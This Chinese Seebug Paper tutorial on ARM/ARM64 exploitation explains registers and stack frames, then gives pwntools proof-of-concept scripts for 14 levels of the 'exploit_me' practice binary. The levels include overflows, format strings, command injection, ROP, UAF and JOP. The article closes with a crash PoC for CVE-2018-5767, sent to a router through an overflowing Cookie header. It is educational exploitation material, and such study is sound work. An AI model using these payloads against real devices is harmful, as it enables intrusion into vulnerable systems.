> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [paper.seebug.org](https://paper.seebug.org/2064/)

> 作者：Ryze-T 本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org

**作者：Ryze-T  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

0x00 简介
-------

ARM 属于 CPU 架构的一种，主要应用于嵌入式设备、智能手机、平板电脑、智能穿戴、物联网设备等。

ARM64 指使用 64 位 ARM 指令集，64 位指指数据处理能力即一条指令处理的数据宽度，指令编码使用定长 32 比特编码。

0x01 ARM
--------

### 1.1 字节序

字节序分为大端（BE）和小端（LE）：

*   大端序（Big-Endian）将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址。这种排列方式与数据用字节表示时的书写顺序一致，符合人类的阅读习惯。
*   小端序（Little-Endian）将一个多位数的低位放在较小的地址处，高位放在较大的地址处。小端序与人类的阅读习惯相反，但更符合计算机读取内存的方式，因为 CPU 读取内存中的数据时，是从低地址向高地址方向进行读取的。

在 v3 之前，ARM 体系结构为 little-endian 字节序，此后，ARM 处理器成为 BI-endian，并具允许可切换字节序。

### 1.2 寄存器

#### 1.2.1 32 位寄存器

R0-R12：正常操作期间存储临时值、指针。

其中：

*   R0 用于存储先前调用的函数的结果
*   R7 用于存储系统调用号
*   R11 跟踪用作帧指针的堆栈的边界，函数调用约定指定函数的前四个参数存储在寄存器 R0-R3 中
*   R13 也称为 SP，作为堆栈指针，指向堆栈的顶部
*   R14 也被称为 LR，作为链接寄存器，进行功能调用时，链接寄存器将使用一个内存地址进行更新，该内存地址引用了从其开始该功能的下一条指令，即保存子程序保存的地址
*   R15 也称为 PC，即程序计数器，程序计数器自动增加执行指令的大小。

![](https://images.seebug.org/content/images/2023/04/26/1682478918000-1wljim.png-w331s)

当参数少于 4 个时，子程序间通过寄存器 R0~R3 来传递参数；当参数个数多于 4 个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反，子程序返回前无需恢复 R0~R3 的值。

在子程序中，使用 R4～R11 保存局部变量，若使用需要入栈保存，子程序返回前需要恢复这些寄存器；R12 是临时寄存器，使用不需要保存。 子程序返回 32 位的整数，使用 R0 返回；返回 64 位整数时，使用 R0 返回低位，R1 返回高位。

#### 1.2.2 64 位寄存器

![](https://images.seebug.org/content/images/2023/04/26/1682478922000-2hdpuh.png-w331s)

### 1.3 指令

ARM 指令模版：

MNEMONIC{S} {condition} {Rd}, Operand1, Operand2

> [!NOTE] MNEMONIC：指令简称 {S}：可选后缀，如果指定了 S，即可根据结果更新条件标志 {condition}：执行指令需满足的条件 {Rd}：用于存储指令结果的寄存器 Operand1：第一个操作数，寄存器或立即数 Operand2：可选，可以是立即数或者带可移位的寄存器

![](https://images.seebug.org/content/images/2023/04/26/1682478923000-3nsolj.png-w331s)

### 1.4 栈帧

栈帧是一个函数所使用的那部分栈，所有的函数的栈帧串起来就是一个完整的栈。栈帧的边界分别由 fp 和 sp 来限定。

![](https://images.seebug.org/content/images/2023/04/26/1682478923000-4lvytv.png-w331s)

FP 就是栈基址，它指向函数的栈帧起始地址；SP 则是函数的栈指针，它指向栈顶的位置。ARM 压栈的顺序依次为当前函数指针 PC、返回指针 LR、栈指针 SP、栈基址 FP、传入参数个数及指针、本地变量和临时变量。

如果函数准备调用另一个函数，跳转之前临时变量区先要保存另一个函数的参数。从 main 函数进入到 func1 函数，main 函数的上边界和下边界保存在被它调用的栈帧里面。

### 1.5 叶子函数和非叶子函数

叶子函数是指本身不会调用其他函数，非叶子函数相反。非叶子函数在调用时 LR 会被修改，因此需要保留该寄存器的值。在栈溢出的场景下，非叶子函数的利用会比较简单。

0x02 固件模拟
---------

ARM 架构的二进制程序，要进行固件模拟才可以运行和调试。

目前比较主流的方法还是使用 QEMU，可以参考[路由器固件模拟环境搭建](https://xz.com/t/5697)，也可以用一些仿真工具，比如 Firmadyne 和 firmAE。

如果想依靠固件模拟自建一些工具，可以考虑使用 [Qiling](https://docs.qiling.io/en/latest/)。

0x03 漏洞
-------

### 3.1 exploit_me

[下载地址](https://paper.seebug.org/2064/[bkerler/exploit_me:%20Very%20vulnerable%20ARM/AARCH64%20application%20(CTF%20style%20exploitation%20tutorial%20with%2014%20vulnerability%20techniques)%20(github.com)](https://github.com/bkerler/exploit_me))

运行 bin 目录下的 expliot64 开始进行挑战：

![](https://images.seebug.org/content/images/2023/04/26/1682478923000-5hymkv.png-w331s)

#### Level 1: Integer overflow

漏洞触发代码如下：

![](https://images.seebug.org/content/images/2023/04/26/1682478924000-6ihsvb.png-w331s)

a1 是传入的第二个参数，atoi 函数可以将传入的参数字符串转为整数，然后进行判断，第一个判断是判断转换后的 v2 是否为 0 或负数，若不是，则进入第二个判断，判断 v2 的低 16 位（WORD）是否不为 0，即低 16 位是否为 0，若为 0 则跳过判断。

atoi 函数存在整数溢出，当输入 -65536，会转换为 0xffff0000：

![](https://images.seebug.org/content/images/2023/04/26/1682478924000-7alrqp.png-w331s)

此数的低 16 位是 0，因此可以绕过判断。

![](https://images.seebug.org/content/images/2023/04/26/1682478924000-8dvcnj.png-w331s)

#### Level 2: Stack overflow

漏洞触发代码如下：

![](https://images.seebug.org/content/images/2023/04/26/1682478924000-9epswr.png-w331s)

![](https://images.seebug.org/content/images/2023/04/26/1682478925000-10hcvul.png-w331s)

verify_user 函数会验证输入的第一个参数是否为 admin，验证完成后，会继续验证第二个参数是否是 funny，看起来似乎很简单，但是可以看到即使两个参数都按照要求输入，也不会得到 level3 password：

![](https://images.seebug.org/content/images/2023/04/26/1682478925000-11pbdtp.png-w331s)

查看第三关的入口，可以看到第三关的 password 参数为 aVelvet：

![](https://images.seebug.org/content/images/2023/04/26/1682478925000-12idnfk.png-w331s)

通过查找引用可以得到 level3password 这个函数才是输出 aVelvet 的关键函数，但是此函数并未被引用。然而 strcpy(&v3, a1) 这一行伪代码暴露出存在栈溢出，因此可以通过覆盖栈上存储的返回地址，来跳转到 level3password 函数中。

首先通过 pwndbg cyclic 生成一个长度为 200 的序列，当作第一个参数输入：

![](https://images.seebug.org/content/images/2023/04/26/1682478926000-13tginf.png-w331s)

得到偏移为 16。

IDA 查看 level3password 地址为 0x401178，因此构造 PoC：

```
from pwn import *
context.arch = 'aarch64'
context.os = 'linux'
pad = b'aaaaaaaaaaaaaaaa\x78\x11\x40'
io = process(argv=['./exploit64','help',pad,'123'])
print(io.recv())

```

![](https://images.seebug.org/content/images/2023/04/26/1682478926000-14yqxeg.png-w331s) 得到 password “Velvet”

#### Level 3: Array overflow

抽出核心代码为：

```
a1 = atoi(argv[2]);
a2 = atoi(argv[3]);
_DWORD v3[32]; // [xsp+20h] [xbp+20h]
v3[a1] = a2;
return printf("filling array position %d with %d\n", a1, a2);

```

这里有很明显的数组越界写入的问题。用 gdb 进行调试：`gdb --args ./exploit64 Velvet 33 1`，在 0x401310（str w2, [x1, x0] 数组赋值） 处下断点，查看寄存器：

![](https://images.seebug.org/content/images/2023/04/26/1682478926000-15yyewa.png-w331s)

可以看到，当执行到赋值语句时，值传递是在栈上进行的，因此此处可以实现栈上的覆盖。

gdbserver 配合 IDA pro 尝试：

![](https://images.seebug.org/content/images/2023/04/26/1682478927000-16vagyq.png-w331s)

当传入参数为 34，00000000 时，可以看到此刻执行`STR W2, [X1,X0]` 是将 00000000 传到 0x000FFFFFFFFEBC0 + 0x84 = 0x000FFFFFFFFEC44 中：

![](https://images.seebug.org/content/images/2023/04/26/1682478927000-17nmldg.png-w331s)

0x000FFFFFFFFEC48 存储的就是 array_overflow 函数在栈上存储的返回地址。

因此只要覆盖此位置就可以劫持程序执行流。与 level2 同理，找到 password 函数地址为 0x00000000004012C8

因此构造 PoC：

```
from pwn import *

context.arch = 'aarch64'
context.os = 'linux'
context.log_level = 'debug'

pad = "4199112"（0x00000000004012C8转十进制作为字符串传入）
io = process(argv=['./exploit64','Velvet',"34",pad])
print(io.recv())

```

![](https://images.seebug.org/content/images/2023/04/26/1682478927000-18anjet.png-w331s)

#### Level 4: Off by one

核心代码如下：

![](https://images.seebug.org/content/images/2023/04/26/1682478928000-19zwval.png-w331s)

传入的参数长度不能大于 0x100，复制到 v3[256] 后，要使 v4 = 0。

字符串在程序中表示时，其实是会多出一个 "0x00" 来作为字符串到结束符号。因此 PoC 为：

```
from pwn import *

context.arch = 'aarch64'
context.os = 'linux'
context.log_level = 'debug'

payload = 'a' * 256
io = process(argv=['./exploit64','mysecret',payload])
print(io.recv())

```

![](https://images.seebug.org/content/images/2023/04/26/1682478928000-20hphte.png-w331s)

#### Level 5: Stack cookie

![](https://images.seebug.org/content/images/2023/04/26/1682478928000-21sutjh.png-w331s)

Stack Cookie 是为了应对栈溢出采取的防护手段之一，目的是在栈上放入一个检验值，若栈溢出 Payload 在覆盖栈空间时，也覆盖了 Stack Cookie，则校验 Cookie 时会退出。

这里的 Stack Cookie 是 secret = 0x1337。

![](https://images.seebug.org/content/images/2023/04/26/1682478928000-22ujtrc.png-w331s)

通过汇编可以看出，v2 存储在 sp+0x58 -- sp+ 0x28 中，所以当 strcpy 没限制长度时，可以覆盖栈空间，secret 存储在 sp+0x6C 中，v3 存储在 sp+0x68 中，因此只要覆盖这两个位置为判断值，就可以完成攻击。

![](https://images.seebug.org/content/images/2023/04/26/1682478929000-23oqgbn.png-w331s)

#### Level 6: Format string

> [!NOTE] 格式化字符串漏洞 格式化字符串漏洞是比较经典的漏洞之一。 printf 函数的第一个参数是字符串，开发者可以使用占位符，将实际要输出的内容，也就是第二个参数通过占位符标识的格式输出。 例如： ![](https://images.seebug.org/content/images/2023/04/26/1682478929000-24orqpn.png-w331s) 当第二个参数为空时，程序也可以输出： ![](https://images.seebug.org/content/images/2023/04/26/1682478929000-25nhsew.png-w331s) 这是因为，printf 从栈上取参时，当第一个参数中存在占位符，它会认为第二个参数也已经压入栈，因此通过这种方式可以读到栈上存储的值。 格式化字符串漏洞的典型利用方法有三个： 1. 栈上数据，如上所述 2. 任意地址读： 当占位符为 %s 时，读取的第二个参数会被当作目标字符串的地址，因此如果可以在栈上写入目标地址，然后作为第二个参数传递给 printf，就可以实现任意地址读 3. 任意地址写： 当占位符为 %n 时，其含义是将占位符之前成功输出的字节数写入到目标地址中，因此可以实现任意地址写，如： ![](https://images.seebug.org/content/images/2023/04/26/1682478929000-26ewmfe.png-w331s) 一般配合 %c 使用，%c 可以输出一个字符，在利用时通过会使用

程序逻辑为：

![](https://images.seebug.org/content/images/2023/04/26/1682478930000-27vmkpw.png-w331s)

![](https://images.seebug.org/content/images/2023/04/26/1682478930000-28xkzms.png-w331s)

程序逻辑为输入 password，打印 password，判断 v1 是否为 89，是则输出密码。

这里 printf(Password)，Password 完全可控，这里存在格式化字符串漏洞。

通过汇编可以看到：

![](https://images.seebug.org/content/images/2023/04/26/1682478930000-29fyyqu.png-w331s)

![](https://images.seebug.org/content/images/2023/04/26/1682478931000-30gartk.png-w331s)

Arm64 函数调用时前八个参数会存入 x0-x7 寄存器，因此第 8 个占位符会从栈上开始取参，sp+0x18 是我们需要修改的地址，因此偏移为 7+3=10。

PoC 为：

```
from pwn import *

context.arch = 'aarch64'
context.os = 'linux'
context.log_level = 'debug'
payload = '%16lx'*9+'%201c%n' # 16*9+201=345=0x159
io = process(argv=['./exploit64','happyness'])
io.sendline(payload)
print(io.recv())

```

![](https://images.seebug.org/content/images/2023/04/26/1682478931000-31nvvtr.png-w331s)

#### Level 7: Heap overflow

![](https://images.seebug.org/content/images/2023/04/26/1682478931000-32bcwut.png-w331s)

v7 和 v8 都是创建的堆空间，且在 strcpy 时未规定长度，因此可以产生堆溢出，从而覆盖到 v7 的堆空间，完成判断。

通过 pwngdb 生成测试字符串，在 printf 处下断点，查看 v7 是否被覆盖和偏移：

![](https://images.seebug.org/content/images/2023/04/26/1682478932000-33rxwot.png-w331s)

通过 x1 寄存器可知，偏移为 48。

因此 PoC 为：

```
from pwn import *

context.arch = 'aarch64'
context.os = 'linux'
context.log_level = 'debug'

payload = 'A'*48 + '\x63\x67'
io = process(argv=['./exploit64','mypony',payload])
#io.sendline(payload)
print(io.recv())

```

![](https://images.seebug.org/content/images/2023/04/26/1682478932000-34askve.png-w331s)

#### Level 8: Structure redirection / Type confusion

![](https://images.seebug.org/content/images/2023/04/26/1682478932000-35bpvbo.png-w331s)

一直跟进 Msg:Msg：

![](https://images.seebug.org/content/images/2023/04/26/1682478932000-36donme.png-w331s)

而在 strcpy 下面一行有用 v12 作为函数指针执行，v12 = v2 = &Run::Run(v2)，

![](https://images.seebug.org/content/images/2023/04/26/1682478933000-37vqbtg.png-w331s)

因此需要通过 strcpy 覆盖栈空间上存储的 v12，来控制函数执行流。且覆盖为 0x4c55a0，从而在取出 v12 当作函数指针执行时可以指向 Msg::msg：

![](https://images.seebug.org/content/images/2023/04/26/1682478933000-38pekbf.png-w331s)

根据汇编，v12 存储在 sp+0x90-0x10 = sp+0x80 处，strcpy 从 sp+0x90-0x68 = sp+0x28 处开始，偏移为 0x80-0x28 - 0x8 = 0x50。

因此 PoC 为：`./exploit64 Exploiter $(python -c 'import sys;sys.stdout.buffer.write(b"A"*(20*4)+b"\xa0\x55\x4c\x00\x00\x00\x00\x00")')`

![](https://images.seebug.org/content/images/2023/04/26/1682478933000-39knerv.png-w331s)

#### Level 9: Zero pointers

![](https://images.seebug.org/content/images/2023/04/26/1682478934000-40iwbml.png-w331s)

![](https://images.seebug.org/content/images/2023/04/26/1682478934000-41tonzk.png-w331s)

![](https://images.seebug.org/content/images/2023/04/26/1682478934000-42cibht.png-w331s)

先使用 gdb 调试， `gdb --args ./exploit64 Gimme a 1`，程序报错：

![](https://images.seebug.org/content/images/2023/04/26/1682478935000-43cqxcm.png-w331s)

第二个参数应该填写的是地址：

![](https://images.seebug.org/content/images/2023/04/26/1682478935000-44ytswa.png-w331s)

在程序执行过程中，v4 指向的值会被置 0，v4 指向的是 a1 的地址，因此 a1 地址指向的值会变为 0。

因此要想完成 v3 的判断，只需要将 v3 地址传入即可。

PoC 为`./exploit64 Gimme 0xffffffffec9c 1`:

![](https://images.seebug.org/content/images/2023/04/26/1682478935000-45yxjby.png-w331s)

#### Level 10: Command injection

![](https://images.seebug.org/content/images/2023/04/26/1682478935000-46knnzr.png-w331s)

关键点 `v9 = "man" + *(a2+16)`，v9 中要包含 “;” 才可以完成判断。

因此 PoC 为 `./exploit64 Fun "a;whoami"`:

![](https://images.seebug.org/content/images/2023/04/26/1682478936000-47gviht.png-w331s)

#### Level 11: Path Traversal

![](https://images.seebug.org/content/images/2023/04/26/1682478936000-48sfxcu.png-w331s)

PoC 为`./exploit64 Violet dir1/dir2/../..`

![](https://images.seebug.org/content/images/2023/04/26/1682478936000-49ezzxd.png-w331s)

#### Level 12: Return oriented programming (ROP)

scanf 并未限制长度，因此此处存在溢出，通过 pwndbg 的 cyclic 得到偏移为 72。

现在目的是跳到 comp 函数中，且参数要为 0x5678：

![](https://images.seebug.org/content/images/2023/04/26/1682478937000-50qviri.png-w331s)

因此需要构造 Rop Gadget，构造的 Gadget 应该具备以下功能，将 comp 判断的地址 0x400784 加入 lr 寄存器 (x30), 并能执行 ret，这样就可以在溢出时，将程序执行流劫持到 Rop Gadget 的地址。

![](https://images.seebug.org/content/images/2023/04/26/1682478937000-51vjpdq.png-w331s)

这样在跳转时这个地址会被压栈作为 Rop 的 ret 的返回地址。

程序给了一个叫 ropgadgetstack 的 rop Gadget：

![](https://images.seebug.org/content/images/2023/04/26/1682478937000-52knfyw.png-w331s)

通过调试可知，x0 和 x1 在 0x400744 执行后都为当前 sp 寄存器存储的值，因此 0x400784 的比较可以正常完成；lr 寄存器，也就是 x30 = （0x400744 时）sp+0x10 + 0x8。

输入 `payload = b'A'*72 + p64(0x400744) + b'BBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJKKKKLLLLMMMMNNNNOOOOPPPP'` 进行调试：

![](https://images.seebug.org/content/images/2023/04/26/1682478937000-53twpit.png-w331s)

可知，paylad 从 0x400744 后，再填充 32 个字符开始，会覆盖到当前 $sp，因此只要再覆盖 24 个字符后，覆盖为 0x400784 就可以在 ret 执行后跳到 comp 的比较处。payload 为 `payload = b'A'*72 + p64(0x400744) + b'B'*32 + b'C'*16 + b'D'*8 + p64(0x400784)`

![](https://images.seebug.org/content/images/2023/04/26/1682478938000-54igfcs.png-w331s)

#### Level 13: Use-after-free

![](https://images.seebug.org/content/images/2023/04/26/1682478938000-55bmrgg.png-w331s)

![](https://images.seebug.org/content/images/2023/04/26/1682478938000-56kxnrh.png-w331s)

根据代码逻辑可看出，输入的第二个参数决定了执行 switch 几次以及执行那一个选项，0 是 malloc，mappingstr 就指向堆块；1 是 free；2 是函数指针执行；3 是 malloc，且 malloc 申请地址后存储的值就是 command。

很明显这是一个 Use After Free，通过 0 创建一个堆块，mappingstr 不为空此时再 free mappingstr，再 malloc 一个相同大小的堆块，就可以申请到 mappingstr 的堆块，复制 command 到堆块后，再通过函数指针执行。level13password 函数地址是 0x4008c4。

因此 payload 为：`payload = b'a' * 64 + p64(0x4008c4)`

执行参数为 0312：

![](https://images.seebug.org/content/images/2023/04/26/1682478938000-57igbde.png-w331s)

#### Level 14: Jump oriented programming (JOP)

与 ROP 不同，JOP 是使用程序间接接跳转和间接调用指令来改变程序的控制流，当程序在执行间接跳转或者是间接调用指令时，程序将从指定寄存器中获得其跳转的目的地址，由于这些跳转目的地址被保存在寄存器中，而攻击者又能通过修改栈中的内容来修改寄存器内容，这使得程序中间接跳转和间接调用的目的地址能被攻击者篡改，从而劫持了程序的执行流。

![](https://images.seebug.org/content/images/2023/04/26/1682478939000-58jmlrk.png-w331s)

关键点在两个 fread 上，第一个 fread 将文件中的 4 个字节读到 v2 中，第二个 read 又将 v2 作为读取字节数，从 v5 中读取到 v3，v3 分配在栈空间上，因此这里会出现栈溢出。

看汇编会更明显：

![](https://images.seebug.org/content/images/2023/04/26/1682478939000-59ylcif.png-w331s)

通过 gdb 测试，得到偏移为 52。

往一个文件里写入 `data = b'A'*52 + p64(0x400898)`

执行：

![](https://images.seebug.org/content/images/2023/04/26/1682478939000-60cedvv.png-w331s)

### 3.2 CVE 案例

#### CVE-2018-5767

具体分析过程可见：[CVE-2018-5767](https://ryze-t.com/2022/09/02/CVE-2018-5767/)

漏洞触发点在：

![](https://images.seebug.org/content/images/2023/04/26/1682478939000-61mehfo.png-w331s)

此处存在一个未经验证的 sscanf，它会将 v40 中存储的值按照 `"%*[^=]=%[^;];*"` 格式化输入到 v33，但是并未验证字符串长度，因此此处会产生一个栈溢出。

PoC 如下：

```
import requests



url = "http://10.211.55.4:80/goform/execCommand"



payload = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae' +".png"

headers = {

'Cookie': 'password=' + payload

}



print(headers)



response = requests.request("GET", url, headers=headers)

```

通过远程调试可观察到，在 PoC 执行后：

![](https://images.seebug.org/content/images/2023/04/26/1682478940000-62tkfue.png-w331s)

由于栈溢出，PC 寄存器被覆盖，导致程序执行到错误的内存地址而报错。偏移量为 444。

0x04 总结
-------

ARM 的分析与 x86 类似，只是在函数调用、寄存器等方面存在差异，相对来说保护机制也较弱，且应用场景更为广泛，如 IOT 设备、车联网等，如果能顺利完成固件提取，可玩性相对较高。

![](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg) 本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/2064/](https://paper.seebug.org/2064/)